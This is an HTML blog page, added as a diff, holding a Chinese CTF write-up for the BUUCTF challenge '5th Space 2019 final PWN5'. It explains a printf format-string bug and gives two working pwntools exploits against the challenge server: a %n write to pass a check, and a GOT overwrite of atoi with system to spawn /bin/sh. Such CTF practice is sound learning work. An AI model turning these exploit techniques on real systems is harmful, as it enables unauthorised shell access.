@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BUUCTF Pwn [第五空间2019 决赛]PWN5 | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BUUCTF Pwn [第五空间2019 决赛]PWN5</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/02/12</h2>
+</div>
+
+<main>
+<h1 id="5th_space_2019_final_pwn5">5th_space_2019_final_pwn5</h1>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200212192653235.png" alt="image-20200212192653235"></p>
+<p>printf(&amp;buf)，明显格式化字符串漏洞，了解atoi函数</p>
+<p>该题有两种解法</p>
+<p>1、第一个read利用格式化字符串漏洞修改unk_804c044的值，第二个read输入我们修改的值去满足if判断执行system('/bin/sh')</p>
+<p>2、第一个read利用格式化字符串漏洞修改atoi_got为system_plt，第二次read输入&rdquo;/bin/sh\x00&quot;，执行system('/bin/sh')</p>
+<p>exp1</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*-conding=UTF-8-*-</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">node3.buuoj.cn</span><span style="color:#e6db74">&#39;</span>,<span style="color:#ae81ff">29326</span>)
+target_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804c044</span>
+payload <span style="color:#f92672">=</span> p32(target_addr) <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">10$n</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e">#target_addr = 4byte 4=0x00000004</span>
+sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">your name:</span><span style="color:#e6db74">&#34;</span>)
+sh<span style="color:#f92672">.</span>sendline(payload)
+sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">your passwd:</span><span style="color:#e6db74">&#34;</span>)
+sh<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">0x00000004</span>))<span style="color:#75715e">#atoi函数将数字</span>
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200212194221114.png" alt="image-20200212194221114"></p>
+<p>exp2</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*-coding=UTF-8-*-</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#75715e">#context(log_level=&#39;debug&#39;)</span>
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./pwn5</span><span style="color:#e6db74">&#39;</span>)
+sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">node3.buuoj.cn</span><span style="color:#e6db74">&#39;</span>,<span style="color:#ae81ff">29326</span>)
+
+atoi_got_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">atoi</span><span style="color:#e6db74">&#39;</span>]
+system_plt_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>]
+
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">atoi_got_addr =&gt; {}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(hex(atoi_got_addr)))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system_plt_addr =&gt; {}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(hex(system_plt_addr)))
+
+format_string_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
+payload <span style="color:#f92672">=</span> fmtstr_payload(format_string_offset,{atoi_got_addr:system_plt_addr})
+<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">fmtstr_payload()自动生成格式化字符串漏洞相应的payload</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">这里是将atoi_got_addr修改为system_plt_addr,从而执行system()</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+<span style="color:#75715e">#print payload</span>
+
+sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">your name:</span><span style="color:#e6db74">&#39;</span>)
+sh<span style="color:#f92672">.</span>sendline(payload)
+
+sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">your passwd:</span><span style="color:#e6db74">&#39;</span>)
+sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)<span style="color:#75715e">#利用第二个read向system传参</span>
+
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200212194300620.png" alt="image-20200212194300620"></p>
+
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
